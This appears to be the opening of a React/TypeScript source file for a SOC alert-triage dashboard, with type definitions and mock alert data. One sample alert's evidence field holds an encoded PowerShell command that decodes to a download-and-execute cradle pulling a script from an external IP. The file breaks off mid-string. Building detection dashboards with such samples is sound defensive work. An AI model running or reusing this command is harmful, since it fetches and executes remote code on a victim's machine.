import { useMemo, useState } from "react";
import { cn } from "@/lib/utils";
import {
  Search, Filter, RefreshCw, Bell, User, X, ShieldAlert, FileText,
  Ban, ThumbsDown, Clock, MapPin, Cpu, Activity,
} from "lucide-react";
import SOCSidebar from "@/components/soc/SOCSidebar";

// ── Types ──────────────────────────────────────────────────────
type Severity = "Critical" | "High" | "Medium" | "Low";
type Status = "New" | "Investigating" | "Escalated" | "False Positive" | "Closed";

interface TimelineEntry {
  time: string;
  analyst: string;
  action: string;
}

interface Alert {
  id: string;          // Rule ID e.g. SOC-R-1042
  name: string;
  hostname: string;
  severity: Severity;
  status: Status;
  mitreId: string;
  mitreName: string;
  sourceIp: string;
  destIp: string;
  time: string;        // display
  user: string;
  os: string;
  edrStatus: "Active" | "Degraded" | "Offline";
  evidence: string;
  timeline: TimelineEntry[];
}

// ── Mock Data ──────────────────────────────────────────────────
const alertsData: Alert[] = [
  {
    id: "SOC-R-1042", name: "PowerShell Encoded Command Execution", hostname: "WKS-PC-0127",
    severity: "Critical", status: "New", mitreId: "T1059.001", mitreName: "PowerShell",
    sourceIp: "10.0.0.42", destIp: "185.220.101.34", time: "14:32:18", user: "CORP\\jsmith",
    os: "Windows 11 Pro 23H2", edrStatus: "Active",
    evidence: `powershell.exe -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO\nZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAo\nACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgAzADQ